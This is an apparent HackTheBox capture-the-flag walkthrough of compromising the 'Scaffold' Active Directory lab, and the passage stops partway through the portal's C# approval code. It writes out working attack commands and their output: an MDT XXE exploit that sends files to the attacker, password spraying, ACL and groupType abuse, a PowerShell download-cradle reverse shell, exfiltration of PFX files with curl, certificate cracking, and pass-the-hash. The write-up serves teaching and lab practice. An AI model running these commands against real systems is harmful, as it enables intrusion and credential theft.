# HackTheBox — Scaffold (Windows / Active Directory — Medium)

**Domain:** `scaffold.htb`
**Target IP :** `10.129.xx.xx`
**Attacker VPN IP:** `10.10.xx.xx`
**Given foothold creds:** `j.harris / [REDACTED]`

---

## 1. Recon

### 1.1 Initial Nmap scan

```
nmap -sV -sC 10.129.xx.xx
```

Result summary:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scaffold.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?    (cert CN=portal.scaffold.htb, SAN: portal.scaffold.htb, DC01)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
3268/tcp open  ldap          (Global Catalog)
3269/tcp open  ssl/ldap      (Global Catalog SSL)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Host script results showed:
- SMB signing enabled and required
- A large clock skew (~7h) between scanner and target — this becomes relevant later because it broke Kerberos authentication for some tools.
- Host name: `DC`, OS: Windows Server 2022 Build 20348.

**Takeaway:** Classic AD Domain Controller — Kerberos, LDAP, SMB, Global Catalog, WinRM are all up. There is also an IIS website on 80/443, one of which (443) is bound to `portal.scaffold.htb`, hinting at a custom web application separate from the domain itself.

### 1.2 Hosts file setup

Since the DC also hosts a custom vhost (`portal.scaffold.htb`), the hosts file was updated:

```
cat /etc/hosts
10.129.xx.xx   scaffold.htb dc.scaffold.htb portal.scaffold.htb dc
```

### 1.3 Validating the given credentials over SMB

Before anything else, the given creds were validated and shares enumerated:

```
nxc smb 10.129.xx.xx -u j.harris -p '[REDACTED]' --shares
```

```
SMB   10.129.xx.xx  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.129.xx.xx  445  DC  [+] scaffold.htb\j.harris:[REDACTED]
SMB   10.129.xx.xx  445  DC  [*] Enumerated shares
Share            Permissions  Remark
ADMIN$                        Remote Admin
C$                            Default share
DeploymentShare$              MDT Deployment Share
IPC$             READ         Remote IPC
NETLOGON         READ         Logon server share
REMINST          READ         Windows Deployment Services Share
SYSVOL           READ         Logon server share
Y$
```

**Proof creds are valid:** the `[+]` line confirms authentication succeeded. Interesting shares immediately stand out: `DeploymentShare$`, `REMINST`, and `Y$` — all pointing at **Microsoft Deployment Toolkit (MDT)** / **Windows Deployment Services (WDS)**, which is the central theme of this box.

### 1.4 Poking at REMINST over SMB

```
impacket-smbclient j.harris@10.129.xx.xx
```

```
# shares
ADMIN$
C$
DeploymentShare$
IPC$
NETLOGON
REMINST
SYSVOL
Y$
# use REMINST
# ls
drw-rw-rw-   0  Boot
drw-rw-rw-   0  Images
drw-rw-rw-   0  Mgmt
drw-rw-rw-   0  Stores
drw-rw-rw-   0  Templates
drw-rw-rw-   0  Tmp
drw-rw-rw-   0  WdsClientUnattend
# cd WdsClientUnattend
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
```

We can list the share but access to `WdsClientUnattend` (which often holds unattended-install answer files with creds) is denied for `j.harris`. Filed away for later.

### 1.5 BloodHound collection

```
bloodhound-python -u j.harris -p '[REDACTED]' -d scaffold.htb -ns 10.129.xx.xx -c All
```

Output (trimmed):

```
INFO: Found AD domain: scaffold.htb
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Found 1 computers
INFO: Found 15 users
INFO: Found 62 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
```

Two things worth calling out:
1. The clock skew we noticed in the nmap scan actually broke Kerberos auth for BloodHound, which fell back to NTLM automatically.
2. At this point in the run, BloodHound didn't have anything immediately actionable, so this data was revisited later once more users/creds were discovered.

### 1.6 The website (portal.scaffold.htb)

Visiting `https://portal.scaffold.htb` and logging in with `j.harris`'s credentials gets a **guest-level** dashboard. It shows a "package audit" feature that matches the naming we saw on the WDS/MDT shares (packages being deployed). However, most functionality is disabled for a guest account — this is a custom internal portal (`ScaffoldPortal`) for managing software package deployment, which becomes central to the privesc chain later.

---

## 2. Finding a second user via LDAP description fields

A very common AD misconfiguration is admins leaving passwords or hints inside the `description` attribute of user objects. This was checked with an NetExec (`nxc`) LDAP module:

```
nxc ldap 10.129.xx.xx -u j.harris -p '[REDACTED]' -M get-desc-users
```

```
GET-DESC...  [+] Found following users:
User: Administrator description: Built-in account for administering the computer/domain
User: Guest         description: Built-in account for guest access to the computer/domain
User: krbtgt        description: Key Distribution Center Service Account
User: m.carter      description: Retained for endpoint migration validation. Temp reset: [REDACTED]
```

This exposed a temporary password for `m.carter` sitting in plaintext inside the description field.

**Testing it:**

```
nxc smb 10.129.xx.xx -u m.carter -p '[REDACTED]'
```

```
SMB   10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED] STATUS_ACCOUNT_DISABLED
```

The password is correct (NetExec would say `STATUS_LOGON_FAILURE` for a wrong password), but the account itself is **disabled**. From the BloodHound data collected earlier, `m.carter` was flagged as a high-value target: this account has the rights to add itself to a "Remote Management"-type group. So the plan became: find a way to **enable** `m.carter` first, then log in with this already-known password.

---

## 3. SID brute-forcing to build a user list

To make future password-spraying attempts easier, all domain users/groups were enumerated via SID brute-forcing (RID cycling) using `j.harris`'s credentials:

```
impacket-lookupsid j.harris@10.129.xx.xx
```

```
[*] Domain SID is: S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx
498: SCAFFOLD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SCAFFOLD\Administrator (SidTypeUser)
501: SCAFFOLD\Guest (SidTypeUser)
502: SCAFFOLD\krbtgt (SidTypeUser)
512: SCAFFOLD\Domain Admins (SidTypeGroup)
...
1000: SCAFFOLD\DC$ (SidTypeUser)
1101: SCAFFOLD\DnsAdmins (SidTypeAlias)
1102: SCAFFOLD\DnsUpdateProxy (SidTypeGroup)
1103: SCAFFOLD\IT (SidTypeGroup)
1104: SCAFFOLD\Package_Developers (SidTypeGroup)
1105: SCAFFOLD\Deploy_Operators (SidTypeGroup)
1106: SCAFFOLD\Endpoint Remote Management (SidTypeGroup)
1107: SCAFFOLD\Helpdesk (SidTypeGroup)
1109: SCAFFOLD\svc_mdt (SidTypeUser)
1110: SCAFFOLD\m.carter (SidTypeUser)
1111: SCAFFOLD\svc_deploy (SidTypeUser)
1112: SCAFFOLD\t.nguyen (SidTypeUser)
1113: SCAFFOLD\j.harris (SidTypeUser)
1114: SCAFFOLD\Helpdesk operator (SidTypeGroup)
1115: SCAFFOLD\Quarantined_Accounts (SidTypeGroup)
1116: SCAFFOLD\Identity_Operations (SidTypeGroup)
1117: SCAFFOLD\r.wilson (SidTypeUser)
```

From this a `users.txt` was built:

```
cat users.txt
svc_mdt
m.carter
svc_deploy
t.nguyen
j.harris
r.wilson
```

The group names already hint at the whole later privilege-escalation chain: `Package_Developers`, `Deploy_Operators`, `Endpoint Remote Management`, `Helpdesk`, `Quarantined_Accounts`, `Identity_Operations`.

### 3.1 Password spray attempt (unsuccessful, at this stage)

The password recovered from `m.carter`'s description was sprayed against all discovered users — this did not work for anyone else, so the recon moved on to other services.

### 3.2 Extra port discovery with rustscan

To make sure nothing was missed on the full TCP range, `rustscan` was run:

```
rustscan -a 10.129.xx.xx
```

This revealed several extra open ports beyond the initial top-1000 nmap scan:

```
53, 80, 88, 135, 139, 389, 443, 445, 464, 593, 636, 3268, 3269,
5040, 5985, 9389, 9800, 9801, 47001,
49250, 49251, 49252, 49664, 49665, 49666, 49667, 49668,
52951, 53548, 53566, 53569, 59268
```

The interesting new ones are **9800** and **9801** — not part of a standard Windows install. A follow-up targeted nmap confirmed the same list and service names (`davsrc` / `sstp-2` guesses from nmap's default service DB, not accurate for what's actually running there).

---

## 4. MDT MonitorService — the real way in (ports 9800 / 9801)

Ports 9800/9801 turned out to belong to **MDT's MonitorService**:
- **9800** — the `MDTMonitorEvent` WCF SOAP endpoint (event posting / settings retrieval), used by MDT clients during OS deployment to report progress back to the deployment server.
- **9801** — an OData ("`MDTMonitorData`") read-back feed exposing the same data as a REST/Atom service.

Both endpoints were reachable **without authentication**.

### 4.1 Enumerating the SOAP service (port 9800)

```
curl http://scaffold.htb:9800/MDTMonitorEvent/
```

This returned the default WCF "You have created a service" landing page, confirming a live WCF SOAP endpoint named `MonitorEventService`.

Fetching the WSDL:

```
curl 'http://scaffold.htb:9800/MDTMonitorEvent/?singleWsdl'
```

The WSDL revealed two exposed operations:
- `PostEvent` — accepts fields like `uniqueID`, `computerName`, `messageId`, `stepName`, `currentStep`, `totalSteps`, `dartIP`, `dartPort`, `dartTicket`, `vmHost`, `vmName`, etc. This is what MDT clients call to report deployment progress.
- `GetSettings` — takes a `uniqueID` and returns a `StreamBody` (base64-encoded blob) — this is how a deploying machine retrieves its `CustomSettings.ini` / `Bootstrap.ini` config, which (as will be shown) can contain **plaintext domain-join credentials**.

### 4.2 Enumerating the OData feed (port 9801)

```
curl -s http://scaffold.htb:9801/MDTMonitorData/
```

```xml
<service xml:base="http://scaffold.htb:9801/MDTMonitorData/" ...>
  <workspace>
    <collection href="Computers">...</collection>
    <collection href="ComputerIdentities">...</collection>
    <collection href="NextIDs">...</collection>
  </workspace>
</service>
```

Fetching the OData metadata document confirmed the underlying schema (`Computer`, `ComputerIdentity`, `NextID` entities), matching what MDT's SQL back-end stores for tracking in-progress deployments (`PercentComplete`, `Settings`, `StepName`, `DartIP`/`DartPort`/`DartTicket` for remote-control sessions, etc.).

### 4.3 The vulnerability — XXE via MDT MonitorService (CVE-class issue)

The MDT MonitorService's `GetSettings`/event-posting flow is vulnerable to **XXE (XML External Entity) injection**, which can be abused to read arbitrary files off the deployment share (and, in the original disclosed exploit, even off the filesystem more broadly) by tricking the service into resolving a malicious external DTD hosted by the attacker, then exfiltrating the file contents back over HTTP.

Public references used:
- Original exploit repo (worked at time of the CVE's disclosure, later patched on newer MDT builds): **https://github.com/garrettfoster13/wtftp**
- A smaller/simplified Python re-implementation used for this box: **https://github.com/manbahadurthapa1248/MDT-XXE-exploit**

The original `wtftp` exploit could, at the time, be used to read both the user and root flag directly through this XXE — but that path has since been patched on this box, so a scaled-down python XXE tool was used instead purely to read the MDT `CustomSettings.ini` and `Bootstrap.ini` files (which live on the `Y$`/`DeploymentShare$` share we saw earlier, and which `j.harris` didn't have rights to browse directly under `WdsClientUnattend`).

### 4.4 Exploiting the XXE to read `CustomSettings.ini`

```
python3 exploit.py --target 10.129.xx.xx --attacker 10.10.xx.xx \
  --file "Y:/DeploymentShare/Control/CustomSettings.ini" \
  --dtd-port 9000 --exfil-port 9001
```

```
[INFO] Server listening on port 9000
[INFO] Server listening on port 9001
[INFO] Event created with GUID: 81c3f439-xxxx-xxxx-xxxx-xxxxxxxxxxxx
[INFO] Computer record ID: 46
[INFO] Payload injected successfully (status 204)
[INFO] Served evil.dtd to 10.129.xx.xx
[INFO] === EXFILTRATED DATA ===
[Settings]
Priority=Default
Properties=MyCustomProperty

[Default]
OSInstall=Y

DeployRoot=\\DC\DeploymentShare$
UserID=svc_deploy
UserPassword=[REDACTED]
UserDomain=scaffold.htb

JoinDomain=scaffold.htb
DomainAdmin=svc_deploy
DomainAdminPassword=[REDACTED]
MachineObjectOU=OU=Workstations,OU=Computers,DC=scaffold,DC=htb

SkipCapture=NO
SkipAdminPassword=YES
SkipProductKey=YES
SkipComputerBackup=NO
SkipBitLocker=NO
SkipLocaleSelection=YES
SkipTimeZone=YES
SkipUserData=YES
SkipComputerName=NO
SkipDomainMembership=NO

KeyboardLocale=en-US
UserLocale=en-US
UILanguage=en-US
HideShell=YES
ApplyGPOPack=YES
EventService=http://dc:9800
[INFO] =========================
[INFO] Settings request completed (status 200)
```

**What just happened, in plain terms:** MDT's `CustomSettings.ini` is the config file every machine reads while being imaged/deployed, and it commonly embeds a service account's credentials so the deploying machine can auto-join the domain. By abusing the unauthenticated XXE in the monitor service, we made the *server itself* read this file off its own deployment share and hand the contents back to us through our fake DTD/exfil listener — without ever needing filesystem access ourselves. This leaked a plaintext password for `svc_deploy` (used both as the deploy account and, interestingly, listed again as a `DomainAdmin` value in the same file — though as we'll see, the two password strings shown differ slightly by a single character, likely a documentation/typo trap).

### 4.5 Exploiting the XXE to read `Bootstrap.ini`

```
python3 exploit.py --target 10.129.xx.xx --attacker 10.10.xx.xx \
  --file "Y:/DeploymentShare/Control/Bootstrap.ini" \
  --dtd-port 9000 --exfil-port 9001
```

```
[INFO] Event created with GUID: 928cf4d3-xxxx-xxxx-xxxx-xxxxxxxxxxxx
[INFO] Computer record ID: 45
[INFO] Payload injected successfully (status 204)
[INFO] Served evil.dtd to 10.129.xx.xx
[INFO] === EXFILTRATED DATA ===
[Settings]
Priority=Default

[Default]
DeployRoot=\\DC\DeploymentShare$
UserID=svc_mdt
UserPassword=[REDACTED]
UserDomain=scaffold.htb
SkipBDDWelcome=YES
[INFO] =========================
```

This second file leaked a plaintext password for a different service account, `svc_mdt`.

**Result of this stage:** two usernames (`svc_deploy`, `svc_mdt`) and effectively three candidate password strings (one for `svc_mdt`, and two very similar-but-not-identical strings tied to `svc_deploy`/`DomainAdmin` in the first file).

---

## 5. Turning leaked creds into a foothold — proving password reuse/validity

Rather than assume which password/user combo was correct, **every candidate password was sprayed against every known username**, and the exact NetExec status codes were captured as proof.

### 5.1 Spray #1 — `svc_mdt`'s password

```
nxc smb 10.129.xx.xx -u users.txt -p '[REDACTED-svc_mdt-pass]' --continue-on-success
```

```
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\svc_mdt:[REDACTED]    STATUS_ACCOUNT_EXPIRED
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\svc_deploy:[REDACTED] STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\t.nguyen:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\j.harris:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\r.wilson:[REDACTED]   STATUS_LOGON_FAILURE
```

`STATUS_ACCOUNT_EXPIRED` on `svc_mdt` confirms the password *is* correct for that account, but the account itself has expired and can't be used to log in as-is.

### 5.2 Spray #2 — first `svc_deploy`/DomainAdmin password variant from `CustomSettings.ini`

```
nxc smb 10.129.xx.xx -u users.txt -p '[REDACTED-variant-1]' --continue-on-success
```

```
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\svc_mdt:[REDACTED]    STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\svc_deploy:[REDACTED] STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\t.nguyen:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\j.harris:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\r.wilson:[REDACTED]   STATUS_LOGON_FAILURE
```

No hits — this variant was wrong for every account.

### 5.3 Spray #3 — second `svc_deploy`/DomainAdmin password variant

```
nxc smb 10.129.xx.xx -u users.txt -p '[REDACTED-variant-2]' --continue-on-success
```

```
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\svc_mdt:[REDACTED]    STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [+] scaffold.htb\svc_deploy:[REDACTED]
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\t.nguyen:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\j.harris:[REDACTED]   STATUS_LOGON_FAILURE
SMB  10.129.xx.xx  445  DC  [+] scaffold.htb\r.wilson:[REDACTED]
```

This one landed — and it landed for **two accounts at once**: `svc_deploy` *and* `r.wilson`. This is a textbook **password reuse** finding: the same password protects both a service account and a regular user account. The `[+]` markers from NetExec are the proof that authentication succeeded for both.

**Lesson on the near-miss earlier:** the `CustomSettings.ini` file contained two password strings that looked almost identical (differing only by a substitution of one character, a common typo-squat/"decoy" pattern), and only the second one was actually the true password in use — a good reminder to always try every literal variant found in a config file rather than assuming which is "the" real one.

---

## 6. Abusing ACLs to enable and take over `m.carter`

With `r.wilson` and `svc_deploy` now available, the BloodHound graph from earlier was revisited (mentally reconstructed here, since the live BloodHound GUI isn't shown, but the abuse paths are exactly what was executed):

```
r.wilson    --add-self-->            HelpDesk Operators  --GenericWrite-->      m.carter
svc_deploy  --member-of-->           Identity_Operations --GenericWrite(group)--> Quarantined_Accounts / IT  --contains--> m.carter
m.carter (after being enabled, and Quarantined_Accounts converted to a Distribution group)
   --member-of--> IT (after IT is converted to a Security/Global group)
   --add-self--> Endpoint Remote Management (a custom group; WinRM itself is blocked for this group,
                  but access can be gained via DCOM/RPC instead of WinRM's HTTP listener)
```

### 6.1 Step 1 — `r.wilson` adds himself to `Helpdesk operator`

```
bloodyad -H scaffold.htb -d scaffold.htb -u r.wilson -p '[REDACTED]' \
  add groupMember 'Helpdesk operator' r.wilson
```

```
[+] r.wilson added to Helpdesk operator
```

### 6.2 Step 2 — Enable `m.carter`'s account

Membership in `Helpdesk operator` (via a `GenericWrite` ACE) grants the ability to write arbitrary attributes on `m.carter`, including `userAccountControl` — the AD flag bitmask that governs whether an account is enabled/disabled. Setting it to `66048` (which is `NORMAL_ACCOUNT (512)` + `DONT_EXPIRE_PASSWORD (65536)`) both **enables** the account and stops its password from expiring:

```
bloodyad -H scaffold.htb -d scaffold.htb -u r.wilson -p '[REDACTED]' \
  set object m.carter userAccountControl -v 66048
```

```
[+] m.carter's userAccountControl has been updated
```

**Verifying the account is enabled, but login is still restricted:**

```
nxc smb 10.129.xx.xx -u m.carter -p '[REDACTED]'
```

```
SMB  10.129.xx.xx  445  DC  [-] scaffold.htb\m.carter:[REDACTED] STATUS_LOGON_TYPE_NOT_GRANTED
```

The status changed from `STATUS_ACCOUNT_DISABLED` to `STATUS_LOGON_TYPE_NOT_GRANTED` — proof the account is now enabled, but the *type* of logon being attempted (network logon, used by SMB) is being denied, most likely because `m.carter` is a member of the `Quarantined_Accounts` group, which is commonly linked to a restrictive GPO that blocks normal logon rights until the account is "released" from quarantine.

### 6.3 Step 3 — Confirm the `svc_deploy → Quarantined_Accounts` write path with `dacledit`

BloodHound doesn't always render every useful ACE relationship cleanly, so the DACL on `Quarantined_Accounts` was read directly to confirm the actual permission:

```
impacket-dacledit -action read -target-dn 'CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb' \
  scaffold.htb/svc_deploy:'[REDACTED]'
```

```
[*] ACE[0] info
    ACE Type      : ACCESS_ALLOWED_OBJECT_ACE
    Access mask   : WriteProperty (0x20)
    Object type (GUID) : Group-Type (9a9a021e-4a5b-11d1-a9c3-0000f80367c1)
    Trustee (SID) : Identity_Operations (S-1-5-21-...-1116)
```

This confirms: members of `Identity_Operations` (which `svc_deploy` belongs to) have `WriteProperty` rights specifically over the **`groupType`** attribute of `Quarantined_Accounts`. `groupType` controls whether a group is a Security group or a Distribution group, and whether it's Global/Domain-Local/Universal — this is exactly the lever needed to defang the quarantine group.

### 6.4 Step 4 — Convert `Quarantined_Accounts` from Security to Distribution group

Windows only applies group-based logon-restriction GPOs (and most security-relevant group logic) to **Security** groups — a **Distribution** group is just a mailing/organizational grouping with no security effect. By flipping `groupType` to `2` (Global Distribution Group), `m.carter`'s membership in `Quarantined_Accounts` stops mattering for logon rights:

```
bloodyad -H scaffold.htb -d scaffold.htb -u svc_deploy -p '[REDACTED]' \
  set object 'CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb' groupType -v 2
```

```
[+] CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb's groupType has been updated
```

**Verifying `m.carter` can now log on:**

```
nxc smb 10.129.xx.xx -u m.carter -p '[REDACTED]'
```

```
SMB  10.129.xx.xx  445  DC  [+] scaffold.htb\m.carter:[REDACTED]
```

Success — `m.carter` is now a usable, logon-capable account.

### 6.5 Step 5 — Same `groupType` trick on `IT`, to prep for the remote-management group

The plan requires `m.carter` (via membership in `IT`) to be able to add himself to `Endpoint Remote Management`. First, the DACL on `IT` was checked the same way:

```
impacket-dacledit -action read -target-dn 'CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb' \
  scaffold.htb/m.carter:'[REDACTED]'
```

```
[*] ACE[0] info
    ACE Type      : ACCESS_ALLOWED_OBJECT_ACE
    Access mask   : WriteProperty (0x20)
    Object type (GUID) : Group-Type (9a9a021e-4a5b-11d1-a9c3-0000f80367c1)
    Trustee (SID) : Identity_Operations (S-1-5-21-...-1116)
```

Same `Identity_Operations` write access, this time on `IT`'s `groupType`. This group needed the opposite conversion: `IT` needed to become a **Security, Universal** group (`-2147483646`) so that its membership actually confers real, security-relevant group membership (Distribution groups can't be nested inside security-relevant groups like `Endpoint Remote Management` for token/permission purposes):

```
bloodyad -H scaffold.htb -d scaffold.htb -u svc_deploy -p '[REDACTED]' \
  set object 'CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb' groupType -v -2147483646
```

```
[+] CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb's groupType has been updated
```

### 6.6 Step 6 — `m.carter` adds himself to `Endpoint Remote Management`

```
bloodyad -H scaffold.htb -d scaffold.htb -u m.carter -p '[REDACTED]' \
  add groupMember 'Endpoint Remote Management' m.carter
```

```
[+] m.carter added to Endpoint Remote Management
```

### 6.7 Checking WinRM — and why it fails

```
nxc winrm 10.129.xx.xx -u m.carter -p '[REDACTED]'
```

```
WINRM  10.129.xx.xx  5985  DC  [-] scaffold.htb\m.carter:[REDACTED]
```

As the notes/box design intended, `Endpoint Remote Management` does **not** actually grant the standard `Remote Management Users` rights needed for WinRM's HTTP-based listener — this custom group only maps to DCOM-based remote execution rights instead. So the pivot was to **DCOM** (which travels over RPC, not WinRM's HTTP endpoint).

---

## 7. Getting code execution as `m.carter` via DCOM

### 7.1 Sanity-check DCOM execution with a ping

```
impacket-dcomexec scaffold.htb/m.carter:'[REDACTED]'@10.129.xx.xx \
  'ping -n 2 10.10.xx.xx' -object MMC20 -nooutput
```

Confirming the ping actually arrived, ICMP was captured on the attacking box:

```
sudo tcpdump -i tun0 icmp
```

```
IP scaffold.htb > kali: ICMP echo request, id 1, seq 1, length 40
IP kali > scaffold.htb: ICMP echo reply, id 1, seq 1, length 40
IP scaffold.htb > kali: ICMP echo request, id 1, seq 2, length 40
IP kali > scaffold.htb: ICMP echo reply, id 1, seq 2, length 40
```

This is solid proof command execution is working as `m.carter`, even though there was no direct output channel from `dcomexec`.

### 7.2 Getting an interactive reverse shell

A PowerShell download-cradle reverse shell one-liner was executed via the same DCOM technique:

```
impacket-dcomexec scaffold.htb/m.carter:'[REDACTED]'@10.129.xx.xx \
  "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.xx.xx:8000/Invoke-PowerShellTcp.ps1');" \
  -object MMC20 -nooutput
```

Catching the callback with `penelope` (a reverse-shell handler/multiplexer):

```
penelope -p 443
```

```
[+] Got reverse shell from scaffold.htb~10.129.xx.xx-WINDOWS
PS C:\windows\system32> whoami
scaffold\m.carter
```

Shell obtained as `m.carter`.

### 7.3 Grabbing the user flag

```
PS C:\Users\m.carter\Desktop> type user.txt
[REDACTED]
```

---

## 8. Discovering code-signing certificates on disk

Browsing the filesystem as `m.carter` turned up a developer certificate folder:

```
PS C:\Dev\DevCerts> ls
```

```
-a----   InternalCodeSigning_01.pfx   3200 bytes
-a----   InternalCodeSigning_02.pfx   3200 bytes
```

### 8.1 Exfiltrating the PFX files

A quick upload server was spun up on the attacker box:

```
python3 -m uploadserver 80
```

And the files were pushed out from the target using `curl.exe`:

```
PS C:\Dev\DevCerts> curl.exe -F "files=@InternalCodeSigning_01.pfx" http://10.10.xx.xx/upload
PS C:\Dev\DevCerts> curl.exe -F "files=@InternalCodeSigning_02.pfx" http://10.10.xx.xx/upload
```

### 8.2 Cracking the PFX passwords

PFX/PKCS#12 files are password-protected containers for a certificate + private key. `pfx2john` converts them into a crackable hash format for John the Ripper:

```
pfx2john InternalCodeSigning_01.pfx > hash
pfx2john InternalCodeSigning_02.pfx >> hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
Loaded 2 password hashes with 2 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x])
[REDACTED-PFX-password]  (InternalCodeSigning_02.pfx)
[REDACTED-PFX-password]  (InternalCodeSigning_01.pfx)
2g 0:00:00:00 DONE
```

Both PFX files shared the **same** cracked password (another instance of password reuse — this time reuse of a certificate-protection password across two separate certs).

### 8.3 Extracting identities and NT hashes from the certificates via Certipy

Certipy's `auth` action can take a client-auth certificate + its password, request a Kerberos TGT with it, and — if the certificate maps to an account — retrieve that account's NT hash via [PKINIT]/UnPAC-the-hash.

**Certificate 1:**

```
certipy-ad auth -pfx InternalCodeSigning_01.pfx -password [REDACTED] -dc-ip 10.129.xx.xx
```

```
[*] Certificate identities:
[*]     SAN UPN: 'd.cooper@scaffold.htb'
[*] Using principal: 'd.cooper@scaffold.htb'
[*] Got TGT
[*] Got hash for 'd.cooper@scaffold.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED-NT-HASH]
```

This gives a fully usable NT hash for `d.cooper` — enough for pass-the-hash.

**Certificate 2:**

```
certipy-ad auth -pfx InternalCodeSigning_02.pfx -password [REDACTED] -dc-ip 10.129.xx.xx
```

```
[*] Certificate identities:
[*]     SAN UPN: 't.walker@scaffold.htb'
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
```

This certificate maps to `t.walker`, but PKINIT authentication fails with `KDC_ERROR_CLIENT_NOT_TRUSTED` — meaning this particular certificate/account combination isn't trusted for domain authentication this way (likely missing a proper mapping such as `NTAuthCertificates` trust, or the cert/account pairing itself isn't valid for logon). This path was a dead end; `d.cooper` became the usable identity going forward.

### 8.4 Confirming `d.cooper`'s group membership

From BloodHound, `d.cooper` is a member of **`Package_Developers`** and **`Remote Management Users`** — meaning WinRM (the *normal* kind, unlike `m.carter`'s DCOM-only path) is available for this account.

### 8.5 Logging in as `d.cooper` via WinRM (pass-the-hash)

```
evil-winrm -i 10.129.xx.xx -u d.cooper -H [REDACTED-NT-HASH]
```

```
*Evil-WinRM* PS C:\Users\d.cooper\Documents> whoami
scaffold\d.cooper
```

---

## 9. Reverse-engineering the ScaffoldPortal application

### 9.1 Reading the app config

```
*Evil-WinRM* PS C:\Dev\Build\ScaffoldPortal> cat appsettings.json
```

Key parts of the config:

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=DC\\SQLEXPRESS;Database=ScaffoldPortal;Integrated Security=True;TrustServerCertificate=True;"
  },
  "Portal": {
    "Domain": "SCAFFOLD",
    "Roles": {
      "Developers": "SCAFFOLD\\Package_Developers",
      "Validators": "SCAFFOLD\\Package_Validators",
      "Admins":     "SCAFFOLD\\Deployment_Admins"
    },
    "FileStorage": {
      "IncomingRoot":   "C:\\Software\\Packages\\Incoming",
      "ReadyRoot":      "C:\\Software\\Packages\\Ready",
      "RejectedRoot":   "C:\\Software\\Packages\\Rejected",
      "ArchiveRoot":    "C:\\Software\\Packages\\Archive",
      "RepositoryRoot": "C:\\Software\\Repository",
      "MaxFileSizeMB": 7
    },
    "TrustedCert": {
      "SubjectMustContain": "CN=Package_Developers",
      "IssuerMustContain":  "scaffold-DC-CA"
    }
  }
}
```

**In plain terms:** this is a real .NET web application (`ScaffoldPortal`) that lets `Package_Developers` upload software packages (MSIs), lets `Package_Validators` review/approve them, and then some deployment engine automatically installs approved packages. The `TrustedCert` block tells us exactly what a package's Authenticode signing certificate needs to look like to be trusted by the deploy engine: **Subject must contain `CN=Package_Developers`**, and it must be **issued by `scaffold-DC-CA`** (this box's internal Certificate Authority).

### 9.2 Reading the validation/approval logic — finding the trust-boundary bug

```
*Evil-WinRM* PS C:\Dev\Build\ScaffoldPortal\Services> cat Services.cs
```

The relevant method, `ApprovePackageAsync`, does the following:

```csharp
public async Task ApprovePackageAsync(int packageId, string validatorUsername,
    string notes, ValidationChecklist checklist)
{
    var pkg = await _db.Packages.FindAsync(packageId)
        ?? throw new InvalidOperationException($"Package {packageId} not found.");

    // Security: only move from Incoming when validator explicitly approves
    var readyPath = await _fileStorage.MoveToReadyAsync(pkg.IncomingPath!, pkg.StoredFileName);

    pkg.Status = PackageStatus.Approved;
    pkg.ReadyPath = readyPath;
    pkg.ReviewedBy = validatorUsername;
    pkg.ReviewedAt = DateTime.UtcNow;
    pkg.ValidationNotes = notes;

    _db.ValidationActions.Add(new ValidationAction
    {
        PackageId = packageId,
